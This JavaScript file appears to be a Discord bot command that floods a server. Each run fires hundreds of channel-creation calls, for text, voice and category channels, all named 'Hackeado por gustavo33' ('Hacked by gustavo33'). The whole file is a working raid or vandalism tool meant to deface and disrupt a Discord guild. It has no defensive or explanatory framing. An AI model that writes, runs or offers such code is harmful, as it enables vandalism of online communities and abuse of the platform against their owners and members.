exports.run = async (client, message) => {
  let tex = "Hackeado por gustavo33"
    function criar3(){
      message.guild.createChannel(tex, "text")
      message.guild.createChannel(tex, "voice")
      message.guild.createChannel(tex, "category")
      message.guild.createChannel(tex, "text")
      message.guild.createChannel(tex, "voice")
      message.guild.createChannel(tex, "category")
      message.guild.createChannel(tex, "text")
      message.guild.createChannel(tex, "voice")
      message.guild.createChannel(tex, "category")
      message.guild.createChannel(tex, "text")
      message.guild.createChannel(tex, "voice")
      message.guild.createChannel(tex, "category")
      message.guild.createChannel(tex, "text")
      message.guild.createChannel(tex, "voice")
      message.guild.createChannel(tex, "category")
      message.guild.createChannel(tex, "text")
      message.guild.createChannel(tex, "voice")
      message.guild.createChannel(tex, "category")
      message.guild.createChannel(tex, "text")
      message.guild.createChannel(tex, "voice")
      message.guild.createChannel(tex, "category")
      message.guild.createChannel(tex, "text")
      message.guild.createChannel(tex, "voice")
      message.guild.createChannel(tex, "category")
      message.guild.createChannel(tex, "text")
      message.guild.createChannel(tex, "voice")
      message.guild.createChannel(tex, "category")
      message.guild.createChannel(tex, "text")
      message.guild.createChannel(tex, "voice")
      message.guild.createChannel(tex, "category")
      message.guild.createChannel(tex, "text")
      message.guild.createChannel(tex, "voice")
      message.guild.createChannel(tex, "category")
      message.guild.createChannel(tex, "text")
      message.guild.createChannel(tex, "voice")
      message.guild.createChannel(tex, "category")
      message.guild.createChannel(tex, "text")
      message.guild.createChannel(tex, "voice")
      message.guild.createChannel(tex, "category")
      message.guild.createChannel(tex, "text")
      message.guild.createChannel(tex, "voice")
      message.guild.createChannel(tex, "category")
      message.guild.createChannel(tex, "text")
      message.guild.createChannel(tex, "voice")
      message.guild.createChannel(tex, "category")
      message.guild.createChannel(tex, "text")
      message.guild.createChannel(tex, "voice")
      message.guild.createChannel(tex, "category")
      message.guild.createChannel(tex, "text")
      message.guild.createChannel(tex, "voice")
      message.guild.createChannel(tex, "category")
      message.guild.createChannel(tex, "text")
      message.guild.createChannel(tex, "voice")
      message.guild.createChannel(tex, "category")
      message.guild.createChannel(tex, "text")
      message.guild.createChannel(tex, "voice")
      message.guild.createChannel(tex, "category")
      message.guild.createChannel(tex, "text")
      message.guild.createChannel(tex, "voice")
      message.guild.createChannel(tex, "category")
      message.guild.createChannel(tex, "text")
      message.guild.createChannel(tex, "voice")
      message.guild.createChannel(tex, "category")
      message.guild.createChannel(tex, "text")
      message.guild.createChannel(tex, "voice")
      message.guild.createChannel(tex, "category")
      message.guild.createChannel(tex, "text")
      message.guild.createChannel(tex, "voice")
      message.guild.createChannel(tex, "category")
      message.guild.createChannel(tex, "text")
      message.guild.createChannel(tex, "voice")
      message.guild.createChannel(tex, "category")
      message.guild.createChannel(tex, "text")
      message.guild.createChannel(tex, "voice")
      message.guild.createChannel(tex, "category")
    } 
    function criar2(){
      criar3()
      criar3()
    }
    function criar1(){
      criar2()
      criar2()
    }
    let criar = function(){
      criar1()
    }
    criar()
}